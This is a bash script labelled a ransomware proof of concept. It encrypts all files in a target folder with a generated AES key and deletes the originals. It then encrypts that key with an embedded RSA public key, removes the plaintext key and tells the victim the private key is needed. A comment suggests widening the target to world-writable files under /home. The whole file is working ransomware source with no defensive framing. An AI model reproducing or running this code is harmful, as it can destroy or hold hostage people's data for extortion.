#!/bin/bash

# Bash Ransomware PoC written by
# Steve Willson

########################################################
# 
#   This program is a bash ramsonware PoC
#   Generate a private/public keypair, put the PUBLIC key in
#   this file, this script will generate a symmetric key, 
#   use it to encrypt specified files encrypt the symmetric key 
#   using the public key and then display the message including 
#   the encrypted public key
#
########################################################

# generate a private key using openssl
# openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# generate the public key from the private key
# openssl rsa -pubout -in private_key.pem -out public_key.pem

# Generate the public key and paste it below
PUBLIC_KEY="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1F1XJnJbVwSlREoBRR82
QrmT/4a2Sox/Y76q0SIpORX4Yk3F/ZxS0nxcmDnVjxGZv6+kRDiefEWbgGzt5zT1
IkFIS1djSSYO3ZX2u2wJDkD5xxkF+ScKoV56cNvYnprw+V3jKDtNYLrC0XTwMr8T
RhURn++h1tesNWtwSB/S7ku19z6I+1+Gtevk3s1UDMmahh6vSYQyapOB3nUbZ7Wv
2SsQs3ybpgj07Dfl+40IK87azYTL1s87CEAWDJcCSoIJr0hDlbcPS1N6BluCGXHK
deD6XadZVe/6DcwnQ2gbI9ltdPRxxCQZRrFPjtFOVa5LdGxTHYrLFZG3zVBayUEb
WwIDAQAB
-----END PUBLIC KEY-----"

# This is the path where the files inside will be encrypted
ENC_PATH="/home/user/attackfolder"

# Generate a symmetric key
echo "Generating symmetric key"
openssl rand -base64 -out /tmp/sym.key 32
echo -e "Symmetric key is \n$(cat /tmp/sym.key)"
echo ""

# Specify the files to encrypt

# could also use "find /home -type f -perm -o=rw 2>/dev/null" to
# find files that are in the /home/ directory that are readable
# and writable by others...

echo "Gathering files to encrypt"
FILES=$(ls $ENC_PATH)
echo -e "This program will encrypt \n$(echo $FILES)"
echo -e "in the folder \n$ENC_PATH"
echo ""

# Encrypt the files using the symmetric key
echo "Encrypting the files using the generated symmetric key"
for file in $FILES; do
    openssl enc -aes-256-cbc -salt -in $ENC_PATH/$file -out $ENC_PATH/$file.enc -k $(cat /tmp/sym.key)
    rm -f $ENC_PATH/$file
done
echo ""

# Once files are encrypted, encrypt the symmetric key using the public key
echo "Encrypting the symmetric key with the public key"
echo "$PUBLIC_KEY" > /tmp/public_key
openssl rsautl -encrypt -inkey /tmp/public_key -pubin -in /tmp/sym.key -out /tmp/sym.key.enc
rm -f /tmp/public_key
echo ""

# Delete the symmetric key
echo "Deleting the unencrypted symmetric key"
rm -f /tmp/sym.key
echo ""

# Display the encrypted symmetric key and a message showing how to
# get a decrypted version of the symmetric key to decrypt the files
echo "Your encrypted symmetric key is stored in /tmp/sym.key.enc"
echo "you will need to decrypt this file with the PRIVATE KEY"
echo "in order to decrypt the files."
echo ""

# To decrypt the files, you will need to run the following commands
# have the PRIVATE_KEY stored

# Save the PRIVATE KEY to /tmp/priv_key
# echo "$PRIVATE_KEY" > /tmp/priv_key

# Decrypt the symmetric key with the private key
# openssl rsautl -decrypt -inkey /tmp/priv_key -in /tmp/sym.key.enc -out /tmp/sym.key

# Go through the encrypted files and decrypt them using the decrypted symmetric key
#for file in $(ls $ENC_PATH); do
#OLDNAME=$file;
#NEWNAME=$(basename $file .enc);
#openssl enc -d -aes-256-cbc -in $ENC_PATH/$OLDNAME -out $ENC_PATH/$NEWNAME -pass file:/tmp/sym.key;
#rm -f $ENC_PATH/$file 
#done

